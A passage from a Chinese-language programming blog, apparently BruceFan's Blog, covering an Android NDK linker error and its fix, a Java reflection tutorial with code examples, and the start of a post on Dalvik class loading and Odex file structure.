class="variable">$(CC)</span> -c test.c <span class="variable">$(FLAGS)</span> -o test.o</span><br></pre></td></tr></table></figure>
<p>主要是<code>ANDROID_NDK</code> <code>NDK_TOOLS</code> <code>TOOLCHAINS_INCLUDE</code> <code>PLATFORM_INCLUDE</code> <code>PLATFORM_LIB</code>几个变量的定义。<br>makefile的基本用法可以看我前面写过的<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/03/06/%E4%BD%BF%E7%94%A8makefile/">这篇文章</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">arm-linux-androideabi-gcc hook1.o -I&#x2F;Users&#x2F;fan&#x2F;Computer&#x2F;Android&#x2F;adt-bundle-mac-x86_64-20140702&#x2F;android-ndk-r10c&#x2F;toolchains&#x2F;arm-linux-androideabi-4.9&#x2F;prebuilt&#x2F;darwin-x86_64&#x2F;lib&#x2F;gcc&#x2F;arm-linux-androideabi&#x2F;4.9&#x2F;include-fixed -I&#x2F;Users&#x2F;fan&#x2F;Computer&#x2F;Android&#x2F;adt-bundle-mac-x86_64-20140702&#x2F;android-ndk-r10c&#x2F;platforms&#x2F;android-21&#x2F;arch-arm&#x2F;usr&#x2F;include -L&#x2F;Users&#x2F;fan&#x2F;Computer&#x2F;Android&#x2F;adt-bundle-mac-x86_64-20140702&#x2F;android-ndk-r10c&#x2F;platforms&#x2F;android-21&#x2F;arch-arm&#x2F;usr&#x2F;lib -fPIC -shared -llog -o hook1</span><br><span class="line">&#x2F;Users&#x2F;fan&#x2F;Computer&#x2F;Android&#x2F;adt-bundle-mac-x86_64-20140702&#x2F;android-ndk-r10c&#x2F;toolchains&#x2F;arm-linux-androideabi-4.9&#x2F;prebuilt&#x2F;darwin-x86_64&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;arm-linux-androideabi&#x2F;4.9&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;arm-linux-androideabi&#x2F;bin&#x2F;ld: error: cannot open crtbegin_so.o: No such file or directory</span><br><span class="line">&#x2F;Users&#x2F;fan&#x2F;Computer&#x2F;Android&#x2F;adt-bundle-mac-x86_64-20140702&#x2F;android-ndk-r10c&#x2F;toolchains&#x2F;arm-linux-androideabi-4.9&#x2F;prebuilt&#x2F;darwin-x86_64&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;arm-linux-androideabi&#x2F;4.9&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;arm-linux-androideabi&#x2F;bin&#x2F;ld: error: cannot open crtend_so.o: No such file or directory</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br><span class="line">make: *** [hook1] Error 1</span><br></pre></td></tr></table></figure>
<p>我在Mac下编译出现这个错误，解决方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;Users&#x2F;fan&#x2F;Computer&#x2F;Android&#x2F;adt-bundle-mac-x86_64-20140702&#x2F;android-ndk-r10c&#x2F;toolchains&#x2F;arm-linux-androideabi-4.9&#x2F;prebuilt&#x2F;darwin-x86_64&#x2F;lib&#x2F;gcc&#x2F;arm-linux-androideabi&#x2F;4.9</span><br><span class="line">$ cp crtbegin.o crtbegin_so.o</span><br><span class="line">$ cp crtend.o crtend_so.o</span><br></pre></td></tr></table></figure>
<p>再编译就能成功生成elf文件了，与ndk-build生成的elf文件的不同是没有去掉符号表。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/04/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Java反射机制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-04-19 11:13:53" itemprop="dateCreated datePublished" datetime="2016-04-19T11:13:53+08:00">2016-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h3><p>反射是Java语言的一个特性，是Java被视为动态语言的一个关键性质。这个机制允许程序在运行时透过Reflection APIs取得任何一个已知名称的class的内部信息，包括modifiers（如public，static等）、superclass（如Object）、实现之interfaces（例如Cloneable），也包括fields和methods的所有信息，并可于运行时改变fields内容或唤起methods。Java可以加载一个运行时才得知名称的class，获得其完整结构。<br><strong>A Simple Example</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DumpMethods</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class c = Class.forName(args[<span class="number">0</span>]);</span><br><span class="line">            Method m[] = c.getDeclaredMethods();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m.length; i++)</span><br><span class="line">                System.out.println(m[i].toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ java DumpMethods java.util.Stack</span><br><span class="line">public java.lang.Object java.util.Stack.push(java.lang.Object)</span><br><span class="line">public synchronized java.lang.Object java.util.Stack.pop()</span><br><span class="line">public synchronized java.lang.Object java.util.Stack.peek()</span><br><span class="line">public boolean java.util.Stack.empty()</span><br><span class="line">public synchronized int java.util.Stack.search(java.lang.Object)</span><br></pre></td></tr></table></figure>
<p>列出了<code>java.util.Stack</code>类的所有方法名和签名。<br>这个程序用<code>class.forName</code>加载特定的类，然后调用<code>getDeclaredMethods</code>取出类中定义的方法列表。<code>java.lang.reflect.Method</code>是一个代表类方法的类。</p>
<h3 id="JDK中提供的Reflection-API"><a href="#JDK中提供的Reflection-API" class="headerlink" title="JDK中提供的Reflection API"></a>JDK中提供的Reflection API</h3><blockquote>
<p><strong>Interfaces</strong><br>AnnotatedElement<br>GenericArrayType<br>GenericDeclaration<br>InvocationHandler<br>Member<br>ParameterizedType<br>Type<br>TypeVariable<br>WildcardType<br><strong>Classes</strong><br>AccessibleObject<br>Array<br>Constructor<br>Field<br>Method<br>Modifier<br>Proxy<br>ReflectPermission<br><strong>Exceptions</strong><br>InvocationTargetException<br>MalformedParameterizedTypeException<br>UndeclaredThrowableException<br><strong>Errors</strong><br>GenericSignatureFormatError</p>
</blockquote>
<h3 id="Java反射机制提供的功能"><a href="#Java反射机制提供的功能" class="headerlink" title="Java反射机制提供的功能"></a>Java反射机制提供的功能</h3><ul>
<li>在运行时判断任意一个对象所属的类</li>
<li>在运行时构造任意一个类的对象</li>
<li>在运行时判断任意一个类所具有的成员变量和方法</li>
<li>在运行时调用任一个对象的方法</li>
<li>在运行时创建新类对象</li>
</ul>
<p>在使用Java的反射功能时，基本首先都要获取类的Class对象，再通过Class对象获取其他的对象。<br>用于测试的类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> pubIntField;</span><br><span class="line">    <span class="keyword">public</span> String pubStringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> prvIntField;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log(<span class="string">&quot;Default Constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Type(<span class="keyword">int</span> arg1, String arg2) &#123;</span><br><span class="line">        pubIntField = arg1;</span><br><span class="line">        pubStringField = arg2;</span><br><span class="line">        Log(<span class="string">&quot;Constructor with parameters&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setIntField</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.prvIntField = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getIntField</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> prvIntField;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Log</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Type:&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExtendType</span> <span class="keyword">extends</span> <span class="title">Type</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> pubIntExtendField;</span><br><span class="line">    <span class="keyword">public</span> String pubStringExtendField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> prvIntExtendField;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExtendType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Log(<span class="string">&quot;Default Constructor&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    ExtendType(<span class="keyword">int</span> arg1, String arg2) &#123;</span><br><span class="line">        pubIntExtendField = arg1;</span><br><span class="line">        pubStringExtendField = arg2;</span><br><span class="line">        Log(<span class="string">&quot;Constructor with parameters&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setIntExtendField</span><span class="params">(<span class="keyword">int</span> field7)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.prvIntExtendField = field7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getIntExtendField</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> prvIntExtendField;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Log</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ExtendType:&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1.获取类的Class对象<br>Class类的实例表示正在运行的Java应用程序中的类和接口。</p>
<ul>
<li>调用getClass<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Boolean var1 = <span class="keyword">new</span> Boolean(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">Class classType1 = var1.getClass();</span><br><span class="line">System.out.println(classType1);</span><br></pre></td></tr></table></figure></li>
<li>运用.class语法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class classType2 = Boolean.class;</span><br><span class="line">System.out.println(ClassType2)</span><br></pre></td></tr></table></figure></li>
<li>运用static method Class.forName()<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class classType3 = Class.forName(<span class="string">&quot;java.lang.Boolean&quot;</span>);</span><br><span class="line">System.out.println(classType3);</span><br></pre></td></tr></table></figure></li>
<li>运用primitive wrapper classes的TYPE语法（这里返回的是原生类型，和Boolean.class返回的不同）<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class classType4 = Boolean.TYPE;</span><br><span class="line">System.out.println(classType4);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>2.获取类的Fields<br>可以通过反射机制得到某个类的某个属性，然后改变对应于这个类的某个实例的该属性值。Java的Class类提供了几个方法获取类的属性。</p>
<ul>
<li><code>public Field getField(String name)</code><br>返回一个Field对象，它反映此Class对象所表示的类或接口的指定public成员字段。</li>
<li><code>public Field[] getFields()</code><br>返回Field对象的数组，这些对象反映此Class对象所表示的类或接口的所有可访问public字段。</li>
<li><code>public Field getDeclaredField(String name)</code><br>返回一个Field对象，它反映此Class对象所表示的类或接口的指定已声明字段。</li>
<li><code>public Field[] getDeclaredFields()</code><br>返回Field对象的数组，这些对象反映出此Class对象所表示的类或接口声明的所有字段。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class classType = ExtendType.class;</span><br><span class="line">Field[] fields = classType.getFields();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    System.out.println(fields[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">fields = classType.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    System.out.println(fields[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>可见getFields和getDeclaredFields区别：</strong><br>getFields返回的是声明为public的属性，包括父类中定义，<br>getDeclaredFields返回的是指定类定义的所有定义的属性，不包括父类的。</p>
</blockquote>
<p>3.获取类的Method<br>通过反射机制得到某个类的某个方法，然后调用对应于这个类的某个实例的该方法。Class类提供了几个获取类方法的方法。</p>
<ul>
<li><code>public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)</code><br>返回一个Method对象，它反映此Class对象所表示的类或接口的指定public成员方法。</li>
<li><code>public Method[] getMethods()</code><br>返回Method对象的数组，这些对象反映此Class对象所表示的类或接口的public成员方法，包括继承的方法。</li>
<li><code>public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</code><br>返回一个Method对象，该对象反映此Class对象所表示的类或接口的指定已声明方法。</li>
<li><code>public Method[] getDeclaredMethods()</code><br>返回Method对象的数组，这些对象反映此Class对象表示的类或接口声明的所有方法，但不包括继承的方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class classType = ExtendType.class;</span><br><span class="line">Method[] methods = classType.getMethods();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    System.out.println(methods[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">methods = classType.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    System.out.println(methods[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.获取类的Constructor<br>通过反射机制得到某个类的构造器，然后调用该构造器创建该类的一个实例，Class类提供了几个方法获取类的构造器。</p>
<ul>
<li><code>public Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;... parameterType)</code><br>返回一个Constructor对象，它反映此Class对象所表示的类的指定public构造方法。</li>
<li><code>public Constructor&lt;?&gt;[] getConstructors()</code><br>返回Constructor对象的数组，这些对象反映此Class对象所表示的类的所有public构造方法。</li>
<li><code>public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</code><br>返回一个Constructor对象，它反映此Class对象所表示的类或接口的指定构造方法。</li>
<li><code>public Constructor&lt;?&gt;[] getDeclaredConstructors()</code><br>返回Constructor对象的数组，这些对象反映此Class对象表示的类声明的所有构造方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Constructor[] constructors = classType.getConstructors();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; constructors.length; i++) &#123;</span><br><span class="line">    System.out.println(constructors[i]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">constructors = classType.getDeclaredConstructors();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; constructors.length; i++) &#123;</span><br><span class="line">    System.out.println(constructors[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>5.新建类的实例<br>通过反射机制创建新类的实例，有几种方法可以创建。</p>
<ul>
<li>调用无自变量ctor</li>
</ul>
<p>(1)调用类的Class对象的newInstance方法，该方法会调用对象的默认构造函数，如果没有默认构造函数，会调用失败。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class classType = ExtendType.class;</span><br><span class="line">Object inst = classType.newInstance();</span><br><span class="line">System.out.println(inst);</span><br></pre></td></tr></table></figure>
<p>(2)调用默认Constructor对象的newInstance方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class classType = ExtendType.class;</span><br><span class="line">Constructor ctor = classType.getConstructor(<span class="keyword">null</span>);</span><br><span class="line">Object inst = ctor.newInstance(<span class="keyword">null</span>);</span><br><span class="line">System.out.println(inst);</span><br></pre></td></tr></table></figure>
<ul>
<li>调用带参数ctor</li>
</ul>
<p>(3)调用带参数Constructor对象的newInstance方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class classType = ExtendType.class;</span><br><span class="line">Class[] params = &#123;<span class="keyword">int</span>.class, String.class&#125;; <span class="comment">// 可以使用匿名类，下一个例子中可以看到</span></span><br><span class="line">Constructor ctor = classType.getDeclaredConstructor(params);</span><br><span class="line">Object[] arg = &#123;<span class="keyword">new</span> Integer(<span class="number">1</span>), <span class="string">&quot;123&quot;</span>&#125;;</span><br><span class="line">Object inst = ctor.newInstance(arg);</span><br><span class="line">System.out.println(inst);</span><br></pre></td></tr></table></figure>
<p>6.调用类的函数<br>通过反射获取类Method对象，调用其Invoke方法调用此函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class classType = ExtendType.class;</span><br><span class="line">Object inst = classType.newInstance();</span><br><span class="line">Method logMethod = classType.getDeclaredMethod(<span class="string">&quot;Log&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class&#125;);</span><br><span class="line">logMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">logMethod.invoke(inst, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;test&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">Type:Default Constructor</span><br><span class="line">ExtendType:Default Constructor</span><br><span class="line">ExtendType:test</span><br></pre></td></tr></table></figure>
<p>7.设置/获取类的属性值<br>通过反射获取类的Field对象，调用Field方法设置或获取值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class classType = ExtendType.class;</span><br><span class="line">Object inst = classType.newInstance();</span><br><span class="line">Field intField = classType.getField(<span class="string">&quot;pubIntExtendField&quot;</span>);</span><br><span class="line">intField.setInt(inst, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">int</span> value = intField.getInt(inst);</span><br><span class="line">System.out.println(value);</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/11/Dalvik%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/04/11/Dalvik%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97/" class="post-title-link" itemprop="url">Dalvik类加载模块</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-04-11 15:57:17" itemprop="dateCreated datePublished" datetime="2016-04-11T15:57:17+08:00">2016-04-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><p>Dalvik虚拟机中，类加载机制的主要功能就是将应用程序中Dalvik操作码以及程序数据提取并加载到虚拟机内部。Dex文件是类加载机制的输入文件，输出是一个名为<code>ClassObject</code>的数据结构实例对象。</p>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p>类加载机制的主要内容及工作流程主要分三点：<br>(1) 对Dex文件进行验证并优化。<br>(2) 对优化后的Dex文件进行解析。<br>(3) 对指定类进行实际加载。</p>
<h2 id="Dex文件的优化与验证"><a href="#Dex文件的优化与验证" class="headerlink" title="Dex文件的优化与验证"></a>Dex文件的优化与验证</h2><p>为了保证原Dex文件的数据安全与优化机制的独立性，优化机制重新创建一个<code>.Odex</code>文件，主要包括<code>依赖库关系</code>、<code>寄存器映射关系</code>以及<code>类的索引关系</code>。</p>
<h3 id="Odex文件结构分析"><a href="#Odex文件结构分析" class="headerlink" title="Odex文件结构分析"></a>Odex文件结构分析</h3><p>Dex文件与Odex文件结构对比：<br><img src="/images/androiddalvik2/dexodex.png"><br>DexOptHeader数据结构定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexOptHeader</span> &#123;</span></span><br><span class="line">    u1 magic[<span class="number">8</span>];   <span class="comment">//Odex文件版本标识</span></span><br><span class="line">    u4 dexOffset;  <span class="comment">// 原Dex文件起始位置偏移量（0x28）</span></span><br><span class="line">    u4 dexLenght;  <span class="comment">// Dex文件总长度</span></span><br><span class="line">    u4 depsOffset; <span class="comment">// Odex文件依赖库列表偏移量</span></span><br><span class="line">    u4 depsLength; <span class="comment">// 依赖库信息总长度</span></span><br><span class="line">    u4 optOffset;  <span class="comment">// 优化数据信息偏移量</span></span><br><span class="line">    u4 optLength;  <span class="comment">// 优化数据总长度，类索引信息封装在这</span></span><br><span class="line">    u4 flags;      <span class="comment">// 标识位，用于标示Odex优化与验证选项</span></span><br><span class="line">    u4 checksum;   <span class="comment">// 文件校验和</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>依赖库信息</li>
</ol>
<p>Dependence结构不会被加载进内存，Android源码中也没有它的明确定义，以下为整理形式。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Dependence</span> &#123;</span></span><br><span class="line">    u4 modWhen;          <span class="comment">// 时间戳</span></span><br><span class="line">    u4 crc;              <span class="comment">// 校验信息</span></span><br><span class="line">    u4 DALVIK_VM_BUILD;  <span class="comment">// 虚拟机版本号</span></span><br><span class="line">    u4 numDeps;          <span class="comment">// 依赖库个数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        u4 len;          <span class="comment">// name长度</span></span><br><span class="line">        u4 name[len];    <span class="comment">// 依赖库名称</span></span><br><span class="line">        kSHA1DigestLen signature; <span class="comment">// SHA-1值</span></span><br><span class="line">    &#125; table[numDeps];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>类索引信息</li>
</ol>
